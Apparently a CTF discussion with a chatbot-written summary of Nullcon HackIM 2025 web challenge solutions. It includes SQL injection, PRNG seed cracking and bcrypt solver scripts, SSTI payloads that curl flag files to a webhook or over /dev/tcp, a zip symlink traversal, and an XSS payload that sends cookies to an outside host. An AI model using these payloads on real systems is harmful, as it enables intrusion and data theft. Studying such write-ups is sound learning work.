Me (and chatGPT) changed your script. It now prints the flag in order. Thank you ```py from multiprocessing.pool import Pool import subprocess import httpx import re url = 'http://52.59.124.14:5008' get_index = { "0": 27, # MD5: 02e74f10e0327ad868d138f2b4fdd6f0 "1": 6, # MD5: 1679091c5a880faf6fb5e6087eb1b2dc "2": 51, # MD5: 2838023a778dfaecdc212708f721b788 "3": 21, # MD5: 3c59dc048e8850243be8079a5c74d079 "4": 9, # MD5: 45c48cce2e2d7fbdea1afc51c7c6ad26 "5": 91, # MD5: 54229abfcfa5649e7003b83dd4755294 "6": 11, # MD5: 6512bd43d9caa6e02c990b0a82652dca "7": 17, # MD5: 70efdf2ec9b086079795c442636b55fb "8": 7, # MD5: 8f14e45fceea167a5a36dedd4bea2543 "9": 15, # MD5: 9bf31c7ff062936a96d3c8bd1f8f2ff3 "a": 4, # MD5: a87ff679a2f3e71d9181a67b7542122c "b": 22, # MD5: b6d767d2f8ed5d21a44b0e5886680cb9 "c": 0, # MD5: cfcd208495d565ef66e7dff9f98764da "d": 10, # MD5: d3d9446802a44259755d38e6d163e820 "e": 3, # MD5: eccbc87e4b5ce2fe28308fd9f2a7baf3 "f": 44, # MD5: f7177163c833dff4b38fc8d2872f1ec6 } alpha = 'abcdefghijklmnopqrstuvwxyz0123456789_-' count = len(alpha) print('[*] Recovering Mersenne Twister seed') def brute_chunk(i): hex_index = hex(i)[2:] username = get_index[hex_index] cook = httpx.post(url, data={'username': username, 'password': ''}).cookies.get('PHPSESSID') idxs = [str(alpha.find(c)) for c in cook[:30]] args = ['./php_mt_seed'] for x in idxs: args.extend([x, x, "0", str(count-1)]) p = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL) while True: line = p.stdout.readline() if line: if b'PHP 7.1.0+' in line: segment = re.search(r'seed = 0x(\w{8})', line.decode()).groups()[0] decoded = bytes.fromhex(segment).decode() print(f'[{hex_index}] {decoded}') return hex_index, decoded else: print(f'Fatal break on {hex_index}') break results = dict(Pool(4).map(brute_chunk, range(0xb))) flag = ''.join(results[key] for key in sorted(results)) print(f'\nFlag: {flag}') ```

My solver for sess.io ```python from multiprocessing.pool import Pool import subprocess import httpx import re url = 'http://52.59.124.14:5008' get_index = { "0": ("YpjTxMtK", "q6ffi5jS"), "1": ("UA9vNHz9", "6qnqnyyO"), "2": ("rcdDzYNl", "vePRxsqt"), "3": ("YSXYMCp8", "4J6GUHqV"), "4": ("fsxPfHzQ", "WipxsHIV"), "5": ("U8kv2TLU", "8Dxb850z"), "6": ("qTH9vbZK", "RfJc31Rq"), "7": ("TkcE8SMd", "fYlMHUMj"), "8": ("svSnGALr", "THC7m3BY"), "9": ("LzMg6BW9", "WjA6Rrm9"), "a": ("TkTglRhf", "T8RBDbYH"), "b": ("GBSapPWT", "ZUx9opIc"), "c": ("Q8bkl5mI", "mQo1CrD4"), "d": ("HY6LYGB2", "H5eFowcX"), "e": ("geZVS6bq", "EfdhWFMX"), "f": ("adWFCksD", "kyfSEjh9"), } alpha = 'abcdefghijklmnopqrstuvwxyz0123456789_-' count = len(alpha) print('[*] Recovering Mersenne Twister seed') def brute_chunk(i): i = hex(i)[2:] username, password = get_index[i] cook = httpx.post(url, data={'username': username, 'password': password}).cookies.get('PHPSESSID') idxs = [str(alpha.find(c)) for c in cook[:30]] args = ['./php_mt_seed'] for x in idxs: args.extend([x, x, "0", str(count-1)]) p = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL) while True: line = p.stdout.readline() if line: if b'PHP 7.1.0+' in line: segment = re.search(r'seed = 0x(\w{8})', line.decode()).groups()[0] print(decoded := bytes.fromhex(segment).decode(), end='', flush=True) return decoded else: print(f'Fatal break on {i}') break results = Pool(4).map(brute_chunk, range(0xb)) print(f'\nFlag: {"".join(results)}') ``` ``` ENO{ _SUP ER_S SOME ECUR AG_1 3333 E_FL ACK} 37_H ENO{SOME_SUPER_SECURE_FLAG_1333337_HACK} ``` ## FLAG `ENO{SOME_SUPER_SECURE_FLAG_1333337_HACK}`

Here's a oneliner to get the flag: ```sh curl "http://52.59.124.14:5015/?p=2,2+UNION+SELECT+*+FROM+flag--" 2>/dev/null | head -n 1 | cut -d '"' -f 2 | base64 -d ``` So the payload is: ```sql 2,2 UNION SELECT * FROM flag-- ``` Here's a clickable link: http://52.59.124.14:5015/?p=2,2+UNION+SELECT+*+FROM+flag--

2025-02-02T14:51:14.451000+00:00
Well, you can index over parts of flag using first symbol of md5(username+pass) string. You can get yourself a set of 10 cracked md5 hashes starting with 0...9 respectively, those selecting 0...9'th part of the flag as your seed. You only have to recover prng's seed now. Login will produce a session that will consist of 1000 of php's Mersenne Twister values, which is enough to recover the seed. You can provide like 30 values to this little tool ðŸ™‚ https://github.com/openwall/php_mt_seed and this will recover a hex of a seed, which is your 4 chars of the flag
2025-02-02T11:28:48.086000+00:00
Numberizer: use these values: 1e99,1,0,1,0 Bfail: the bcrypt function stops at byte number 72 so you only need to brute force the last byte Paginator: ?p=2,10 or 1=1 PaginatorV2: wrote a script to extract the flag from flag table, mainly the payload was: or (select value from flag) GLOB '{GUESS_CHAR_HERE}*' use GLOB instead of LIKE because it was base64 encoded so its case sensitive. but u could use union select * from flag directly as it consists of 3 columns like the pages table [ didn't notice that till someone said it here lol ðŸ˜… ] Sess.io: the idea is about the SEED in random functions where if you used the same seed the same random values will occur, keeping that in mind if we review the source of the challenge we will find that it splits the flag to chunks of 4 and then use them as a SEED for the mt_rand function, it determine which part of the chucks will be used based on ur input [ the username&password ], it concatenates them then get the md5 hash and use the first character of the md5 as an index of the chunk, so what we will do first is to get list of hashes from 0 --> 9 to cover all the possible indexes in the array then save them into array or set to use them after that to brute-force the flag chunks, you can do this by setting the seed to the brute-forced 4 chars and then use the same session_id_secure function to get an id and if the output inside the array u saved before, that means its a valid chunk so append it to flag Temptation: ``` $__import__('os').system('curl+http://webhook/`cat+/tmp/f*.txt`') ```, you can execute code inside web.template.Template back to their doc for more info zoney: https://blog.n0va.in/posts/nullcon-writeup/

Gemini Chat Summary

Nullcon HackIM 2025 CTF: Web Challenge Solutions Summary

This document summarizes the discussion, techniques, and solutions for various web challenges from the Nullcon 2025 CTF. The conversation covered a wide range of vulnerabilities including SQL Injection, insecure pseudo-random number generation, server-side template injection, cryptographic flaws, and path traversal.

Paginator & Paginator V2

Vulnerability: SQL Injection
Two main approaches were discussed for this challenge. The first was a direct UNION-based SQL injection, possible because the original query's table had the same number of columns as the injection. The second was a blind, character-by-character exfiltration of the flag using the GLOB operator, which is case-sensitive and necessary for the base64-encoded flag.

Payloads:

-- Direct UNION Injection
?p=2,2 UNION SELECT * FROM flag--

-- Blind Injection (inside a script)
or (select value from flag) GLOB '{GUESS_CHAR_HERE}*'

Python Solver (Blind Method):

import requests as req
import string

url = "http://52.59.124.14:5015/?p=2,2"
list_of_char = " "+string.ascii_letters+string.digits+"-=_"
flag = ""

for i in range(77):
    print(f"Flag_so_far: {flag}")
    for char in list_of_char:
        temp = flag+char
        payload = f" or (select value from flag) GLOB '{temp}*'"
        response = req.get(url+payload)
        if "Page 3 (ID=3) has content:" in response.text:
            print(f"Found Char! {char}")
            flag = temp
            break

Reference: Paginator v2 Writeup

Sess.io

Vulnerability: Insecure PRNG (PHP Mersenne Twister Seed Prediction)
The challenge involved predicting the seed used by PHP's mt_rand() function. The flag was split into 4-character chunks, and one of these chunks was used as the seed based on the MD5 hash of the user's credentials. By generating a session ID from the PRNG output, it was possible to reverse the process. The solution involved feeding ~30 characters of the session ID to the php_mt_seed tool to recover the seed, which corresponded to a part of the flag. This process was repeated for all possible chunks to reconstruct the full flag.

Python Solver:

from multiprocessing.pool import Pool
import subprocess
import httpx
import re

url = 'http://52.59.124.14:5008'
# ... (get_index mapping and alpha definition) ...
alpha = 'abcdefghijklmnopqrstuvwxyz0123456789_-'
count = len(alpha)

def brute_chunk(i):
    i = hex(i)[2:]
    username, password = get_index[i]
    cook = httpx.post(url, data={'username': username, 'password': password}).cookies.get('PHPSESSID')
    idxs = [str(alpha.find(c)) for c in cook[:30]]
    
    # Use php_mt_seed to crack the seed from session ID characters
    args = ['./php_mt_seed']
    for x in idxs:
        args.extend([x, x, "0", str(count-1)])
    
    p = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
    
    while True:
        line = p.stdout.readline()
        if line and b'PHP 7.1.0+' in line:
            segment = re.search(r'seed = 0x(\w{8})', line.decode()).groups()[0]
            decoded = bytes.fromhex(segment).decode()
            return decoded
        elif not line:
            break
# ... (multiprocessing logic to assemble the flag) ...

Tool: openwall/php_mt_seed

Temptation

Vulnerability: Server-Side Template Injection (SSTI)
The application used a vulnerable template engine (web.template.Template) that allowed arbitrary Python code execution. Payloads were crafted to use __import__('os').system(...) to run shell commands. This was used to read the flag file (e.g., /tmp/fla*.txt) and exfiltrate its contents via an outbound HTTP request to a controlled server (e.g., webhook, ngrok).

Example Payloads:

# Payload to send flag to a webhook
${__import__('os').system('curl+http://webhook/`cat+/tmp/f*.txt`')}

# Payload to send base64-encoded flag to a server
${__import__('os').system('curl+https://my_sever_ip_address/$(cat+/tmp/*|+base64)')}

# Payload to establish a reverse shell
${__import__('os').system('bash -c "cat /tmp/fla* > /dev/tcp/{ip}/{port}"')}

Bfail

Vulnerability: Cryptographic Flaw (bcrypt 72-byte limitation)
The core of this challenge was the property that many bcrypt implementations only process the first 72 bytes of a password. A leaked password hash prefix (71 bytes) was provided. The solution was to brute-force the final (72nd) byte until bcrypt.checkpw returned true against the known hash.

Python Solver:

import bcrypt
import requests

leak = b'\xec\x9f\xe0a\x978\xfc\xb6:T\xe2\xa0\xc9<\x9e\x1a\xa5\xfao\xb2\x15\x86\xe5$\x86Z\x1a\xd4\xca#\x15\xd2x\xa0\x0e0\xca\xbc\x89T\xc5V6\xf1\xa4\xa8S\x8a%I\xd8gI\x15\xe9\xe7$M\x15\xdc @\xa9\xa1@\x9c\xeee\xe0\xe0\xf76'
expected = b'$2b$12$8bMrI6D9TMYXeMv8pq8RjemsZg.HekhkQUqLymBic/cRhiKRa3YPK'

i = 0
while i < 255:
    if bcrypt.checkpw(leak + bytes([i]), expected):
        print(f"last byte is (decimal) {i}")
        # The correct last byte was 170 (0xaa)
        break
    i += 1

zpr

Vulnerability: Path Traversal via Zip Symlinks
The application allowed file uploads and was vulnerable to path traversal when handling zip archives. The solution was to create a symbolic link pointing to the flag file (located at ../../../flag), add this symlink to a zip file, and upload it. The server would follow the symlink upon extraction, allowing the flag to be read.

Shell Commands:

# 1. Create a symlink named 'x' pointing to the flag
ln -sfn ../../../flag x

# 2. Create a zip file containing the symlink
zip a.zip x --symlink

# 3. Upload the zip file
curl -F "file=@a.zip" http://52.59.124.14:10015/

Falafel Shop 2

Vulnerability: Stored Cross-Site Scripting (XSS)
A stored XSS vulnerability was present in the file upload functionality. A malicious payload could be injected into the filename of an uploaded file. The proof-of-concept involved using JavaScript to construct a File object with a crafted filename containing an SVG with an onload event handler.

HTML/JavaScript PoC:

<form action="http://localhost:5010/contest.php" method="POST" enctype="multipart/form-data">
    <input type="file" name="fileToUpload" id="fileToUpload">
</form>
<script>
    const file = new File(["foo"], "foo'><svg onload=eval(atob('bG9jYXRpb249J2h0dHBzOi8vZWZlYXdzZGFzZGFzZGYuZnJlZS5iZWVjZXB0b3IuY29tLz9jPScrZG9jdW1lbnQuY29va2llOw=='))>.jpg", {
        type: "image/jpeg",
    });
    const dataTransfer = new DataTransfer();
    dataTransfer.items.add(file);
    document.forms[0].children[0].files = dataTransfer.files;
    document.forms[0].submit();
</script>

Other Notable Challenges & Links

  • zoney: An info disclosure vulnerability where visiting /?source=1 leaked the source code due to a faulty truthiness check. Writeup: n0va.in blog.
  • traversaller: A path traversal solved using a php://filter stream wrapper to read and base64-encode the flag file.
  • AWS S3 Misconfiguration: AWS credentials were found in a publicly readable .boto file within an S3 bucket (nullcon-static-content-public-bucket) linked from the website.
  • General Security Resources: Numerous links were shared, including writeups for previous nullcon CTFs, articles on various vulnerabilities (SSRF, XSS, SQLi, RCE) from authors like shahjerry33, and documentation from PortSwigger and Python.org.
